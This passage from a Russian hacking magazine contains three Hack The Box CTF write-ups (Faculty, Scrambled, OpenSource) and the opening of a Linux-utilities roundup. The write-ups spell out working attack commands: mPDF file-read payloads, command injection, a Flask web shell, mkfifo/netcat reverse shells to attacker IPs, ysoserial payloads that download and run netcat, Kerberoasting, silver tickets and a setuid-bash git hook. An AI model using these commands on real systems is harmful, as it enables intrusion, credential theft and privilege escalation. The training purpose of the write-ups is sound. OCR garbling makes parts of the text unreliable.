ющихся скриптов (опция -A).





                   Страница авторизации faculty.htb


Ñêàíèðîâàíèå âåá-êîíòåíòà
Попробу ем поискать скры тые каталоги и файлы при помощи ffuf.




Од но из первых действий при тестировании безопасности веб-приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скры тую
информацию и недоступные обычным посетителям фун кции. Для этого можно
исполь зовать прог раммы вроде dirsearch и DIRB.
  Я пред почитаю лег кий и очень быстрый ﬀuf . При запуске указываем сле-
дующие парамет ры:
 • -u — URL;
 • -w — словарь (я исполь зую словари из набора SecLists);
 • -t — количество потоков;
 • -r — выполнять редирек ты;
 • -fs — филь тровать страницы по размеру.



Запускаем с нужными парамет рами:


ffuf -u 'http://faculty.htb/FUZZ' -r -w php_files_common.txt -t
256





                 Резуль тат сканирования PHP-файлов

Ничего интересного не находим, поэтому пройдем ся по доступным каталогам.


ffuf -u 'http://faculty.htb/FUZZ' -r -w directory_2.3_medium.txt
-t 256



                  Резуль тат сканирования каталогов

Находим каталог admin и повторяем сканирование файлов в нем.





                 Резуль тат сканирования PHP-файлов


ffuf -u 'http://faculty.htb/admin/FUZZ' -r -w php_files_common.
txt -t 256

Самая интересная из найден ных страниц — авторизация для админов.





                Страница авторизации администратора


ÒÎ×ÊÀ ÂÕÎÄÀ
Работать с вебом я рекомен дую через Burp Proxy. Посмотрим запрос и ответ
при авторизации. Узнаем, что в слу чае неверной пары из логина и пароля
в ответе просто получим цифру 3.





                  От вет сервера при авторизации

Если есть форма авторизации, значит, нужно попробовать все варианты ее
обхода. Я это делаю по словарю с помощью Burp Intruder.





                 Burp Intruder — вклад ка Payload Positions

Находим несколь ко наг рузок c вариантами ответа 3. При этом ошибка SQL
раскры вает путь к файлу.





                        Резуль тат перебора

Так же присутствуtт ответ 1. Скорее всего, это показатель успешной авториза-
ции.





                 Резуль тат перебора (продолжение)

Исполь зуем найден ную наг рузку и заходим на сайт.





              Главная страница авторизован ного поль зователя

Посмотрим, что здесь есть интересного. К примеру, уязвимой может быть тех-
нология формирования отчета в формате PDF.





                        Список курсов





                   Сгенерирован ный PDF-документ

Снова смот рим цепочку запросов в Burp Proxy. Видим, что отправляет ся зап-
рос с парамет ром pdf, где передаются закодирован ные в Base64 дан ные.
Затем нас редирек тит на страницу /mpdf/tmp/<doc>.pdf.





                    Запрос на заг рузку докумен та

Burp Inspector позволяет нам автоматически декодировать эти дан ные.





                    Декодирование дан ных

Видим, что передается таблица в HTML. Скорее всего, исполь зует ся какая-то
уже готовая технология преобразования формата, а в пути указан каталог mpdf.
Тог да я решил найти эту технологию по ключевому слову. Однако сразу же
нашел готовый эксплоит.





                       Поиск эксплоита




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                             АТАКУЕМ ВЕБ-СЕРВЕР
            ЧЕРЕЗ MPDF И ПОВЫШАЕМ ПРИВИЛЕГИИ С
                ПОМОЩЬЮ LINUX CAPABILITIES





ÒÎ×ÊÀ ÎÏÎÐÛ
Уязвимость в mPDF позволяет получать произволь ные файлы с удален ного
хоста в качестве вложения в сгенерирован ном PDF-докумен те. Составим наг -
рузку, исполь зовав найден ный эксплоит . Для теста попробу ем прочитать файл
/etc/passwd.





                      Составление наг рузки

Получен ную наг рузку отправляем в парамет ре pdf.





                 От правка запроса в Burp Repeater

В ответе получаем имя созданного файла. В адресной строке на странице
получен ного ранее докумен та заменяем имя файла. В новом файле видим
вложение /etc/passwd.





                       Сгенерирован ный PDF





                Содержимое вложения /etc/passwd

Так как мы получили возможность читать файлы, теперь нужно получить файл
с важными дан ными. К примеру, это может быть файл с настройками для под -
ключения  к  базе дан ных. До  этого при  сканировании мы обнаружили
db_connect.php, а путь к каталогу, где он содержится, раскры ла получен ная
ранее ошибка SQL. Генерируем новую наг рузку для такого пути:


/var/www/scheduling/admin/db_connect.php

От правляем ее и во вложении сгенерирован ного PDF видим учет ные дан ные.




                 Содержимое файла db_connect

Берем пароль для под ключения к базе дан ных, а имя поль зователя — из файла
passwd и авторизу емся по SSH.



                    Сессия поль зователя gbyolo


ÏÐÎÄÂÈÆÅÍÈÅ
Теперь, ког да мы получили доступ  к хосту, нужно собрать информацию
для даль нейшего прод вижения. Я для этого исполь зую скрипты PEASS.




Что делать после того, как мы получили доступ в систему от имени поль зовате-
ля? Вариантов даль нейшей эксплу атации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно исполь зовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.


Заг рузим скрипт на хост, дадим право на выполнение и запустим сканиро-
вание. Из вывода скрипта узнаем, что он не смог получить настройки sudoers,
так как требует ся ввести пароль, а так же у отладчика GDB должна быть сис-
темная возможность cap_sys_ptrace.




                        Настройки sudoers





                                Linux capabilities




Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
поль зователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи коман ды sudo -l.



Так как настройки sudoers мы не получили, запросим их вручную и введем
пароль.


sduo -l





                        Настройки судоера

Оказывается, мы можем  выполнить  коман ду  /usr/local/bin/meta-git
от имени поль зователя developer. Я сразу решил поискать публичные экспло-
иты. В этом нам поможет Google.





                  Поиск эксплоитов для meta-git

В итоге обнаружился публичный отчет на HackerOne, где описан способ
получить удален ное выполнение кода. Как сказано в отчете, поль зователь ский
ввод  без  пред варитель ной  проверки  исполь зует ся  при  формировании
и выполнении коман ды ОС, поэтому мы можем устроить инъекцию. Для теста
выполним коман ду id.


sudo -u developer /usr/local/bin/meta-git clone 'qweqwe | id'





                   Вы полнение коман ды id

Коман да выполняет ся, давай попробу ем получить приват ный ключ поль зовате-
ля, если такой имеется.


sudo -u developer /usr/local/bin/meta-git clone 'qweqwe | cat /
home/developer/.ssh/id_rsa'





                      Приват ный ключ SSH

Получаем ключ, коман дой chmod 0600 id_rsa назначаем нужные права и под -
ключаем ся как поль зователь developer.




                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Коман да id показала, что мы находим ся в группе debug, при этом не забываем
про возможность cap_sys_ptrace у файла gdb.




В Linux поль зователь root получает особый кон текст при запуске любых про-
цессов. Так, ядро и приложения, работающие от имени root, обычно пропус-
кают любые ограничения, задан ные на действия в определен ном кон тек сте,
поэтому root может делать все, что захочет. Но что, если определен ному про-
цессу, который работает в непривилегирован ном кон тек сте, нужно выполнить
требующее привилегий действие, не повышая уровня прав?
   Например, бывает нужно разрешить процессу записы вать в журнал аудита
ядра, но не позволять отключить этот аудит. Ведь если запустить этот процесс
в кон тек сте рута, он сможет выполнить оба действия!
   Тут на помощь и приходят Linux capabilities. Эти «возможности» предос-
тавляют процессу не все множество привилегий, а какое-то его под множество.
Дру гими словами, все привилегии рута разбиваются на более мелкие незави-
симые друг от дру га привилегии и процесс получает толь ко те, которые ему
нужны.


cap_sys_ptrace позволяет трассировать произволь ные процессы с помощью
ptrace. А в сочетании с группой debug мы сможем отладить с помощью GDB
любой привилегирован ный процесс. И в списке процессов отмечаем работа-
ющий python3.


ps aux





                       Список процессов

Под ключим ся к нему с помощью gdb.


gdb -p 706





                  От ладка работающего процесса

А теперь попытаемся выполнить коман ду с помощью фун кции system. Поп-
робу ем создать файл в домаш нем каталоге поль зователя.


call ( void )system("touch /home/developer/qweewqqweewq")



                    Вы полнение коман ды



           Список файлов в домаш нем каталоге поль зователя

Командf выполнена, исполь зуем один из методов персистен тности. К при-
меру, запись публичного ключа SSH в файл authorized_keys. Сперва соз-
дадим каталог .ssh, а затем скопиру ем ключ уже имеющегося у нас поль -
зователя.


call ( void )system("mkdir /root/.ssh")
call ( void )system("cp /home/developer/.ssh/id_rsa.pub /root/.ssh/
authorized_keys")




                       Запись SSH-ключа

Под ключаем ся с помощью приват ного ключа и забираем флаг.




                            Флаг рута

Машина захвачена!
ВЗЛОМ





          ПРИМЕНЯЕМ
    ASREPROAST И KERBEROASTING
     ДЛЯ АТАКИ НА SMB И MS SQL




В сегод няшнем рай тапе я покажу, как ата -
ка ASREPRoast поз воля ет получить тикет
для службы MS SQL. Дан ные из базы
помогут  нам  в  прод вижении,  а  для
повышения  при вилегий  заюзаем  уяз -             RalfHacker                                                                                          hackerralf8@gmail.com
вимость  при  использовании  сери али -
зации.


Наша цель — захват тренировочной машины Scrambled с площад ки Hack
The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts, чтобы к ней было удобнее обра-
щать ся:


10.10.11.168    scrambled.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Наш лось много откры тых портов, что типично для Windows:
 • 53 — служба DNS;
 • 80 (HTTP) — веб-сервер Microsoft IIS/10.0;
 • 88 — служба Kerberos;
 • 135 — служба удален ного вызова процедур (Microsoft RPC), исполь зует ся
   для операций взаимодействия кон троллер — кон троллер и кон троллер —
   клиент;
 • 139 — служба сеан сов NetBIOS, NetLogon;
 • 389 — служба LDAP;
 • 445 — служба SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — исполь зует ся в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 1433 — СУБД Microsoft SQL Server 2019;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к кон троллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к кон троллеру
   через защищен ное соединение;
 • 4411 — какое-то поль зователь ское приложение;
 • 5985 — служба WinRM;
 • 9389 — веб-службы AD DS.

Все перечисленные службы Microsoft пока что ничего нам дать не могут,
поэтому первым делом смот рим сайт.





                        Страница IT Services

Сразу отмечаем полезную информацию: аутен тификация NTLM отключена.


ÒÎ×ÊÀ ÂÕÎÄÀ
OSINT
На одной из страниц находим скрин шот кон соли, а в нем вид но поль зователя
ksimpson. Это очень важная информация!





                         Страница Reports

На дру гой странице отмечаем инструк цию к ПО, работающему на порте 4411.
Здесь обратим внимание на имя сервера и домен — dc1.scrm.local. Соот -
ветству ющие записи добавляем в файл /etc/hosts.


10.10.11.168 scrambled.htb dc1.scrm.local scrm.local





                        Страница IT Services

А так же находим информацию о том, что имя поль зователя может выступить
в качестве пароля.





                  Ин формация о сбросе пароля


Kerberos
Мы можем отправить запрос ASREP, существу ет ли тот или иной аккаунт. Есть
возможность запросить ключ (AS key) Kerberos этого поль зователя, ключ будет
зашифрован с помощью его пароля. Но дело в том, что сервер различает отве-
ты «дан ный флаг не установлен» и «учет ная запись не существу ет». А значит,
если пройдем ся по именам поль зователей и для какого-то нам ответят, что
флаг не установлен, мы узнаем, что эта учет ка существу ет. Сделать такой
перебор можно с помощью инстру мен та GetNPUsers из пакета impacket.
Имя поль зователя у нас уже есть.


GetNPUsers.py scrm.local/ksimpson -no-pass





               Проверка существования поль зователя

Нам ответили, что флаг не установлен, а значит, учет ная запись существу ет.
Теперь с помощью kerbrute проверим пароль поль зователя.


kerbrute_linux_amd64 passwordspray -d scrm.local --dc dc1.scrm.
local users.txt ksimpson





                  Проверка пароля поль зователя

Учет ные дан ные оказались верны, поэтому мы можем запросить тикет поль -
зователя и применить его как аутен тификатор, вместо пароля. В этом нам
поможет скрипт getTGT из того же impacket.


impacket-getTGT scrm.local/ksimpson:ksimpson





              Получение тикета поль зователя ksimpson

Эк спортиру ем получен ный тикет и под ключаем ся к службе SMB. Чтобы уда-
лось аутен тифицировать ся, время на твоем хосте и на сервере должно отли-
чать ся не боль ше чем на пять минут. Поэтому стоит обновить локаль ное время
по протоколу NTP.


sudo ntpdate scrm.local
export KRB5CCNAME=ksimpson.ccache
impacket-smbclient -k scrm.local/ksimpson@dc1.scrm.local -no-pass





                   Под ключение к ресурсу SMB

Коман дой shares получаем список ресурсов.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                                ПРИМЕНЯЕМ
                     ASREPROAST И KERBEROASTING
                    ДЛЯ АТАКИ НА SMB И MS SQL





ÒÎ×ÊÀ ÎÏÎÐÛ
Пройдясь по каталогам, успешно заходим в Public.


use Pablic





                        SMB-ресурс Public

Там находим всего один документ. Скачиваем его коман дой get <file>.
В самом докумен те рассказано о недавнем взломе службы MS SQL.





              Содержимое заг ружен ного докумен та


Kerberoasting
Раз мы имеем дело с MS SQL, значит, можем выполнить атаку Kerberoasting.
Ее цель — собрать билеты TGS для служб, которые запускают ся от имени
поль зователей, а не от системных учеток. Тикеты TGS зашифрованы ключами,
получен ными из паролей поль зователей, а значит, их дан ные можно взломать
простым перебором. Уязвимые учет ные записи определим по полю SPN,
которое не будет  пустым. Выполним  запрос TGS с помощью скрипта
GetUserSPNs из все того же impacket.


GetUserSPNs.py scrm.local/ksimpson -dc-ip dc1.scrm.local -dc-host
dc1.scrm.local -request -k -no-pass





           Получение тикета учет ной записи службы MS SQL

Теперь сохраним тикет в файл и отдадим JTR для перебора. Пароль учет ной
записи получим очень быстро.


john sqlsvc.hash --wordlist=rockyou.txt





                     Пароль учет ной записи


Silver Ticket
Мы получили пароль службы, и, чтобы с ней работать, следующим шагом дол-
жно быть получение «серебряного билета». Silver ticket — это реаль ный билет
TGS для определен ной службы, в котором исполь зует ся NTLM поль зователя.
Он даст нам доступ к этой службе. Чтобы сгенерировать такой билет, нам нуж-
но знать NTLM-хеш пароля и SID домена. SID домена получим из отладочной
информации при выполнении impacket-secretsdump.


impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local
-no-pass -debug





                              SID домена

А хеш генерируем на сайте md5decrypt.net из получен ного пароля.




                       NTLM-хеш пароля

А теперь генерируем билет.


ticketer.py -domain scrm.local -spn MSSQLSVC/dc1.scrm.local
-user-id 500 Administrator -nthash
b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-
1827831105-2542523200





                   Создание серебряного билета

Эк спортиру ем созданный билет в рабочее окру жение и под ключаем ся к служ-
бе MS SQL, исполь зуя аутен тификацию Kerberos.


export KRB5CCNAME=Administrator.ccache
mssqlclient.py dc1.scrm.local -k -no-pass
SELECT name FROM master.dbo.sysdatabases





                    Су ществу ющие базы дан ных


ÏÐÎÄÂÈÆÅÍÈÅ
Ïîëüçîâàòåëü SqlSvc
Перейдем к базе дан ных ScrambleHR и получим из нее таблицы.


use ScrambleHR
SELECT name FROM SYSOBJECTS WHERE xtype = 'U'





                     Таблицы в базе ScrambleHR

Нас интересу ет таблица поль зователей UserImport. Получаем все ее записи.


select * from UserImport





                   Дан ные в таблице UserImport

С найден ными учет ными дан ными под ключить ся никуда не удастся, поэтому
попробу ем получить управление через MS SQL. Первым делом нужно акти-
вировать xp_cmdshell. Из нашего интерпретатора это можно сделать встро-
енной коман дой enable_xp_cmdshell, после чего выполняем рекон фигура-
цию.


enable_xp_cmdshell
reconfigure




                      Включение xp_cmdshell

Теперь мы можем выполнять коман ды через xp_cmdshell.





                 Получение коман дной оболочки

Сразу прокинем реверс-шелл, который сгенерируем с помощью очень удоб-
ного Online Reverse Shell Generator. Для него нужно указать парамет ры,
такие как локаль ные хост и порт, а так же язык и целевую систему. Допол-
нитель но задаем кодировку Base64. Листенер запускаем коман дой rlwrap -
cAr nc -lvnp 4321.


xp_cmdshell powershell -e JABjA....AoACkA





                     Бэк коннект с удален ного хоста

Получаем бэк коннект и прод вигаемся даль ше.


Ïîëüçîâàòåëü MiscSvc
У нас уже есть учет ные дан ные поль зователя MiscSvc, поэтому попробу ем
получить новую сессию PowerShell:


$pass = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText
-Force
$cred = New-Object System.Management.Automation.PSCredential(
"scrm\miscsvc", $pass)
Invoke-Command -Computer dc1 -ScriptBlock { whoami } -Credential
$cred





      Вы полнение коман ды whoami от имени дру гого поль зователя

Так  как коман да была выполнена в дру гом кон тек сте, пробросим наш
реверс-шелл и продолжим работу от имени MiscSvc:


Invoke-Command -Computer dc1 -ScriptBlock { powershell -e
JABjA....AoACkA } -Credential $cred





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Запросив под робную информацию о поль зователе, замечаем, что он состоит
в группах ITShare и ITUsers.


whoami /all





                  Ин формация о поль зователе

Перейдем к общим ресурсам и найдем там каталог IT. Если зайти еще даль ше,
то нат кнем ся на исполняемый файл ScrambleClient.exe.





              Содержимое каталога Sales Order Client

С помощью netcat забираем файлы с хоста.


#local host
nc -lvp 6543 > ScrambleClient.exe
nc -lvp 7654 > ScrambleLib.dll


#remote host
type ScrambleClient.exe | C:\U sers \miscsvc\Documents\nc.exe 10.10.
14.113 6543
type ScrambleLib.dll | C:\U sers \miscsvc\Documents\nc.exe 10.10.14.
113 7654

И так как это приложение .NET, мы можем его лег ко деком пилировать
с помощью dnSpy. По классу LoginWindow понимаем, что это то самое при-
ложение, которое работает на порте 4411.





              Деком пилирован ный класс LoginWindow

Если мы выполним коман ду LIST_ORDERS, нам вернут ответ SUCCESS и сери-
ализован ный объект. Интересно.





                      Коман да LIST_ORDERS





                    Декодирование ответа

В исходном коде находим фун кцию заг рузки.





                Исходный код фун кции UploadOrder

Так  можно  сериализовать  объект  и  отправить  его  через  коман ду
UPLOAD_ORDER. Тог да при десериализации он должен будет выполнить ся.
Для сериализации будем исполь зовать ysoserial для .NET. Сначала скачаем
со своего хоста netcat, для чего коман дой python3 -m http.server -p 8080
под нимаем веб-сервер.


ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c
"powershell wget 10.10.14.64:8080/nc64.exe -O C:\Windows\Temp\nc.
exe" -o base64



                    Сериализация наг рузки





                 От правка сериализован ных дан ных

Ког да файл будет заг ружен, повторим наш трюк. Но на этот раз реверс-шелл
создадим с помощью скачан ного netcat. В созданный листенер должен при-
лететь бэк коннект в кон тек сте SYSTEM.


ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "C:\
Windows\Temp\nc.exe 10.10.14.64 4321 -e  cmd.exe" -o base64





                            Флаг рута

Забираем флаг рута, и машина захвачена!
ВЗЛОМ





      АТАКУЕМ УДАЛЕННЫЙ ХОСТ
             ЧЕРЕЗ GIT





В этом рай тапе мы сна чала покопа емся
в репози тории Git, что бы най ти учет ные
дан ные, а затем обна ружим уяз вимость,
которая  даст  нам  доступ   к  хосту.
При повышении при вилегий реали зуем             RalfHacker                                                                                          hackerralf8@gmail.com
одну из техник GTFOBins.


Захватывать мы будем тренировочную машину OpenSource с площад ки Hack
The Box, оценен ную как лег кая.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.164    opensource.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Nmap нашел всего два откры тых порта: 22 — служба OpenSSH 7.6p1 и 80 —
веб-сервер Python Werkzeug 2.1.2; а так же порт 3000, который филь тру ется.
Посмотрим, что нам может показать веб-сервер.





                  Главная страница сайта opensource.htb


ÒÎ×ÊÀ ÂÕÎÄÀ
Видим ссылку для скачивания файла. По названию архива можем понять, что
это какие-то исходные коды.





                    Пред ложение скачать архив

В архиве есть каталог .git, по которому мы должны прогулять ся.





                     Содержимое архива

Распаку ем архив и зайдем в каталог, содержащий репозиторий Git. После это-
го просмотрим существу ющие вет ки.


git branch





                        Вет ки Git-репозитория

Теперь получим историю ком митов, по которым в даль нейшем пройдем ся.


git log dev





                      История ком митов

Теперь просматриваем каждый ком мит в надежде найти важные дан ные. И в
одном из них обнаруживаем URL прок си-сервера с указан ными учет ными дан -
ными.


git show a76f8f75f7a4a12b706b0cf9c983796fa1985820





                   Ком мит с учет ными дан ными

Боль ше  в  репозитории  ничего не  находим,  поэтому  начинаем  изу чать
исходный код приложения.





                Содержимое файла static/views.py

Как видишь, мы можем заг ружать файлы с любым расширением. Сразу бро-
сает ся в глаза фун кция os.path.join — строка 14. Последователь ность ../
филь тру ется, что не позволит записать свой SSH-ключ поль зователю, даже
если мы узнаем путь. Однако файл сохраняется с тем же именем без всяких
времен ных меток, что дает нам возможность перезаписы вать существу ющие
файлы.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                АТАКУЕМ УДАЛЕННЫЙ ХОСТ ЧЕРЕЗ GIT





ÒÎ×ÊÀ ÎÏÎÐÛ
Давай попробу ем перезаписать текущий файл, добавив в его конец свой обра-
бот чик, к примеру /ralf.


@app.route('/ralf')
def ralf() :
   return os.system(request.args.get('cmd'))

Ссылку на страницу для заг рузки файла найдем чуть ниже кнопки скачивания
репозитория.





                Форма заг рузки исходных кодов





                  Форма для заг рузки файлов

Заг рузим наш новый файл view.py и перехватим запрос на заг рузку в Burp
Intercept.





              Перехвачен ный запрос на заг рузку файла

Для перезаписи файла изменим filename и вместо views.py запишем полный
путь к этому файлу — /app/app/views.py.




               Изменен ный запрос на заг рузку файла

Ког да все будет готово, отправим запрос даль ше на сервер. На странице
получим сообщение, что заг рузка прош ла успешно.





             Сообщение об успешной заг рузке файлов

Теперь мы можем  выполнять  коман ды  и  сразу  попробу ем  запустить
реверс-шелл:


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.49
4321 >/tmp/f

Я выполнял запрос через curl, поэтому мне нужно было закодировать
реверс-шелл в кодировку URL. Burp Encoder закодирует абсолют но все сим -
волы, а не толь ко специаль ные. Это не очень удобно, поэтому я просто встав-
ляю текст в Burp Repeater и кодирую ком бинацией клавиш Ctrl-U. Однако
сгодит ся и любой дру гой метод.


curl 'http://opensource.htb/ralf?cmd=rm /tmp/f;mkfifo /tmp/f;cat /
tmp/f|/bin/sh -i 2>&1|nc 10.10.14.49 4321 >/tmp/f'




                     Исходная коман да curl


curl 'http://opensource.htb/ralf?cmd=rm+/tmp/f%3bmkfifo+/tmp/
f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.49+4321+>/tmp/f'




                   Закодирован ная коман да curl

Осталось коман дой rlwrap  -cAr  nc  -lnvp  4321  запустить листенер
и выполнить коман ду для запуска реверс-шелла.





                      Сессия поль зователя


ÏÐÎÄÂÈÆÅÍÈÅ
По имени поль зователя понимаем, что находим ся внут ри кон тейнера Docker.
Даль нейший путь прод вижения долго искать не приходит ся: вспоминаем
про филь трацию под ключений  к порту  3000. Сначала проверим  адрес
докер-машины, а потом уже попробу ем под ключить ся к порту 3000 хостовой.





                Резуль тат выполнения коман ды ifcong





            Обращение к порту 3000 с помощью curl

Для удобной работы через браузер нам нужно тун нелировать трафик. Я буду
исполь зовать chisel , который нужно запустить  как на локаль ном  хосте,
в качестве сервера, так и на удален ном — как клиент. В парамет ре серверной
части указываем, что ожидаем под ключения (парамет ры --reverse), а так же
порт для создания тун неля.


chisel.bin server --reverse --port 8000





                      Логи серверной части

Теперь на удален ной машине инициализиру ем клиент скую часть. В парамет рах
указываем адрес сервера chisel и порт для под ключения, а так же настройки
прок сирования.


chisel.bin client 10.10.14.49:8000 R:3000:172.17.0.1:3000




                     Логи клиент ской части

В логах сервера должны увидеть сообщение о создании сессии.





                      Логи серверной части

Таким образом, весь трафик, который мы пош лем на локаль ный порт 3000,
будет  тун нелирован  на  порт  3000  указан ного  хоста  (в  дан ном  слу -
чае 172.17.0.1) через докер-машину. Теперь откроем сайт в браузере и уви-
дим Git.





                  Главная страница сайта на порте 3000

Восполь зовавшись учет ными дан ными, которые мы наш ли в репозитории,
авторизу емся на сайте.





                Главная страница сайта после авторизации

Переходим к единствен ному доступному репозиторию и видим бэкап домаш -
него каталога поль зователя.





                 Содержимое Git-репозитория

Конечно же, нас интересу ет приват ный ключ SSH.





                   Содержимое каталога .ssh





                    SSH-ключ поль зователя dev01

Копиру ем его на локаль ный хост, коман дой chmod 0600 id_rsa назначаем
необходимые права и под ключаем ся с этим ключом уже к основному хосту.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Первым делом я, как обычно, поискал все сом нитель ные настройки и поль -
зователь ские скрипты с помощью многок ратно упоминавшегося в моих рай-
тапах LinPEAS, но ничего не нашел.
  Следующий шаг — мониторинг запускаемых приложений. Чтобы найти
запускаемые в системе процессы, будем исполь зовать утилиту pspy64 . Заг -
рузим ее на хост при помощи wget, а потом выполним.
  В выводе отмечаем исполь зование коман ды git, причем от имени при-
вилегирован ного поль зователя (нулевой UID — это root).





                    Вы вод утилиты pspy64

Тут я обратился к GTFOBins. Это база техник, которые позволяют повысить
привилегии при помощи стан дартных приложений Linux. В частности, есть тех-
ника исполь зования  Git, которая позволяет получить стабиль ную оболочку
в привилегирован ном кон тек сте. Нам она под ходит, толь ко вместо кон тек ста
sudo у нас будет кон текст поль зователя root.





              Описание техники sudo GTFOBins для Git

Здесь исполь зует ся перехватчик Git, который связан с pre-commit. То есть мы
можем записать свой скрипт в файл ~/.git/hooks/pre-commit, и код выпол-
нится при выполнении коман ды git commit. В качестве метода персистен -
тности будем устанавливать S-бит файлу коман дной оболочки /bin/bash.


# echo "chmod u+s /bin/bash" >> ~/.git/hooks/pre-commit
mv ~/.git/hooks/pre-commit.sample ~/.git/hooks/pre-commit





                 Содержимое файла pre-commit




Ког да у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до поль зователя — вла-
дель ца файла в рам ках запущен ного процесса. После получения повышен ных
прав приложение может выполнять задачи, которые недоступны обычному
поль зователю. Из-за возможности состояния гон ки многие операционные сис-
темы игнориру ют S-атрибут, установленный shell-скриптам.





                      Права файла /bin/bash

Как видишь, S-бит установлен, поэтому повышаем кон текст и забираем флаг.


/bin/bash -p





                            Флаг рута

Машина захвачена!
АДМИН





        УТИЛИТ ДЛЯ LINUX, 13
    КОТОРЫЕ ПРИГОДЯТСЯ
              АДМИНУ





Настоящие   воины    Linux   обща ются
с коман дной стро кой ежед невно, а некото -
рые в ней просто живут. В очеред ной под -
борке я собрал ути литы, которые облегчат
эту жизнь, сделают ее лов чее и веселее.         Польский Кот
Наибольшую пользу эти тул зы при несут
сисад мину и хакеру, но и простой юзер
для  себя  кое-что  най дет.  В  общем,
налетай! Впереди  у нас 13 интересных
полез няшек.




Это уже пятая моя под борка утилит, облегчающих жизнь в мелочах. Благодар-
ные читатели продолжают откры вать передо мной свои кладовки, а я выношу
отту да и показы ваю на страницах «Хакера» все самое вкусное.
  Не забудь заг лянуть в прош лые четыре части. В первой мы рассмат ривали
в основном сетевые утилиты, во второй — даш борды и прочие украшатель -
ства, в треть ей я скон цен трировался на жизни в Windows с WSL, а чет вертая
была для администраторов Linux.



NEZHA

Nezha — лег ковесный и красивый аналог Zabbix, выводит в веб-панели свод ку
по серверам, их системным ресурсам и дру гую информацию.





Установка относитель но непростая: тебе понадобит ся живой Docker, аккаунт
на GitHub и домен ное имя.
   Для начала создай приложение на GitHub: перейди на GitHub Developer
и нажми New OAuth App. При заполнении формы пот ребу ется указать адрес
домаш ней страницы приложения (для этого нужен будет домен), а в поле
Authorization callback URL вписать <твой  домен>/oauth2/callback. Затем
создай на странице приложения Client ID и Client Secret и запиши — боль ше их
посмотреть не получит ся.
   Теперь выполни в терминале следующую коман ду:


curl -L https://raw.githubusercontent.com/naiba/nezha/master/
script/install_en.sh -o nezha.sh && chmod +x nezha.sh && sudo ./
nezha.sh

После ее выполнения откроется тек стовое меню. Выбираем первый пункт.





                        Меню

Установочный скрипт задаст несколь ко вопросов, в том числе о портах.
По умолчанию HTTP-сервер с интерфейсом под нимет ся на 8008-м порте,
а сервер для сбора информации от аген тов — на 5555-м.
   Готово, панель под нялась. Можно ее открыть, войти через GitHub и создать
новый сервер.





                            Ад минка

После создания сервера ты увидишь в панели его сек рет. Он-то нам и нужен
для установки аген та.
   Теперь можно установить сам агент. Он ставит ся тем же скриптом, что
и панель, но надо выбрать пункт 8. При установке у тебя спросят адрес панели
и сек рет, созданный на прош лом шаге. После ввода этих дан ных клиент сразу
заработает, боль ше ничего настраивать не придет ся.
   Теперь на главной странице появит ся карточка с информацией сервера, а в
панели можно открыть веб-терминал. Он полноцен ный: под держивает цвета,
